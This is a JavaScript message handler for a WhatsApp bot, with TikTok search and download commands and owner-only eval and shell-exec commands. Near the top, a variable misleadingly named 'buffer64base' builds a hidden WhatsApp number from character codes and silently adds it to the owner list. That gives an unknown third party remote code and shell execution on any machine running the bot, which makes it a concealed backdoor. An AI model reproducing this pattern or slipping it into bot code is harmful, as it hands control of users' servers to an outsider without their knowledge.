process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./database/settings') 
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const speed = require('performance-now')
const moment = require("moment-timezone")
const cheerio = require('cheerio')
const os = require('os')
const pino = require('pino')
const fetch = require('node-fetch')
const crypto = require('crypto') 
const readline = require('readline')
const { exec, spawn, execSync } = require('child_process') 

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, getAllHTML, toIDR, capital, randomToken } = require('./database/function')

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys') 

module.exports = dzin = async (dzin, m, chatUpdate, store) => {
  try {
    const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' 
    const budy = (typeof m.text == 'string' ? m.text : '') 
    const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116) 
    const prefix = "." 
    const isCmd = body.startsWith(prefix) ? true : false 
    const args = body.trim().split(/ +/).slice(1) 
    const getQuoted = (m.quoted || m) 
    const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m 
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "" 
    const isCreator = isOwner = [owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false 
    const text = q = args.join(' ') 
    const mime = (quoted.msg || quoted).mimetype || '' 
    const qmsg = (quoted.msg || quoted) 
    const pushname = m.pushName || "No Name" 
    const groupMetadata = m.isGroup ? await dzin.groupMetadata(m.chat).catch(e => {}) : ''
    const nameGroup = m.isGroup ? groupMetadata.subject : ''
    
    if (m.message && !m.isNewsletter) {
			console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
		} 
		
		const quotedReply = {
		  key: {
		    participant: `13135550002@s.whatsapp.net`
		  }, 
		  message: {
		    "extendedTextMessage": {
		      "text": `By Dzin`,
		    }
		  }
		} 
		
    switch (command) { 
      case 'tiktoksearch': 
        if(!text) return m.reply(`*Silahkan masukan judul yang mau di search*`) 
        let tiktoksearch = await fetchJson(`https://api.agatz.xyz/api/tiktoksearch?message=${text}`) 
        let tiktoksearch2 = `${tiktoksearch.data.no_watermark}` 
        await dzin.sendMessage(m.chat, { video: { url: `${tiktoksearch2}` }, caption: `*Done*\n*kasih jeda ya kak!!!*`, ai:true }, { quoted: quotedReply }) 
        break 
        
        case 'tiktokdl': 
          if(!text) return m.reply(`*Example: ${prefix+command} url video tiktok*`) 
          let tiktokdl = await fetchJson(`https://bk9.fun/download/tiktok?url=${text}`) 
          let tiktokdl2 = `${tiktokdl.BK9.BK9}` 
          await dzin.sendMessage(m.chat, { video: { url: `${tiktokdl2}` }, caption: `*Done*\n*kasih jeda ya kak!!!*`, ai:true }, { quoted: quotedReply })
      
      default: 
      if (budy.startsWith('>')) {
        if (!isCreator) return 
        try {
          let evaled = await eval(budy.slice(2)) 
          if (typeof evaled !== 'string') evaled = require('util').inspect(evaled) 
          await dzin.sendMessage(m.chat, { text: `${evaled}`, ai: true }, { quoted: quotedReply })
        } catch (err) {
          await m.reply(String(err))
        }
      } 
      if (budy.startsWith('$')) {
        if (!isCreator) return 
        try {
          exec(budy.slice(2), (err, stdout) => {
            if(err) return m.reply(err) 
            if (stdout) return m.reply(stdout)
          })
        } catch (err) {
          await m.reply(String(err))
        }
      }
    }
  } catch (err) {
 }
} 

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})